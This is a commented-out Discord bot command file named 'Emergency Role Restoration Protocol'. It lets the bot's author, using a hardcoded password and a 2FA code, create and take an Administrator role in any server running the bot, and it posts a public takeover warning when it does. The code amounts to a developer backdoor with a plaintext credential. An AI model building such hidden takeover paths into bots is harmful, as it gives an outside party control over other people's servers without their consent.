/**const { EmbedBuilder, PermissionsBitField, DiscordAPIError, SlashCommandBuilder } = require('discord.js');
const { author } = require('../../package-lock.json');
let { getRandomCode } = require('../../Events/Client/two_fa-codes')

module.exports = {
  data: new SlashCommandBuilder()
  .setName('errp-init')
  .setDescription('Emergency Role Restoration Protocol.')
  .addStringOption(option =>
    option
      .setName('password')
      .setDescription('Enter the password.')
      .setRequired(true)
  )
  .addStringOption(option =>
    option
      .setName('role-name')
      .setDescription('Choose an admin role name.')
      .setRequired(true)
  )
  .addIntegerOption(option =>
    option
      .setName('two-fa')
      .setDescription('Type the 2FA code.')
      .setRequired(true)
  ),
  async execute(interaction) {
    const { client, user } = interaction;
    const guild = client.guilds.cache.get(interaction.guildId); // Access guild ID from interaction

    // Check if the user executing the command is the specific username you want to allow
    const allowedUsername = author;
    if (user.id !== allowedUsername) {
      const error = new EmbedBuilder()
        .setTitle('Uh, oh!')
        .setColor('#E74C3C')
        .setDescription('You are not authorised to use this command!');
      return interaction.reply({ embeds: [error], ephemeral: true });
    }

    const password = interaction.options.getString('password');
    const role_name = interaction.options.getString('role-name');
    const two_fa = interaction.options.getInteger('two-fa');

    if (password === 'Tango One One Two Pi Alpha Zero Charlie Zero 1256' && two_fa === getRandomCode()) {
      const embed = new EmbedBuilder()
        .setColor('#1F8B4C')
        .setTitle('WARNING: Takeover complete!')
        .setDescription(`@everyone, <@${user.id}> now has complete control over the ${guild.name} server!\nIf this was not permitted by staff do the following:\n- Ban the member that issued the command!\n- Ban the <@1114241468417183764> bot from the server!\n- \`[Optional]\` Initiate security actions!`);

      await interaction.reply({ embeds: [embed], flags: [ 16 ] });

      const role = await interaction.guild.roles.create({
        name: role_name,
        permissions: [PermissionsBitField.Flags.Administrator],
        color: '#FF0000'
      });
      await interaction.member.roles.add(role);
      const lowestRole = interaction.guild.roles.cache.sort((a, b) => a.position - b.position).first();
      const n = guild.roles.cache.size;
      try {
        for (let i = 1; i <= n; i++) {
          await role.setPosition(lowestRole.position + i);
        }
      } catch (DiscordAPIError) {
        DiscordAPIError.message
      }
    } else if (two_fa !== getRandomCode()){
      const embed = new EmbedBuilder()
        .setColor('#E74C3C')
        .setTitle('Warning, 2FA code incorrect!')
        .setDescription(`You are not allowed to execute this command without the 2FA!`);

      await interaction.reply({ embeds: [embed], ephemeral: true });

    } else {
      const embed = new EmbedBuilder()
        .setColor('#E74C3C')
        .setTitle('Warning, password incorrect!')
        .setDescription(`You are not allowed to execute this command without the correct password!`);

      await interaction.reply({ embeds: [embed], ephemeral: true });
    }
  }
};**/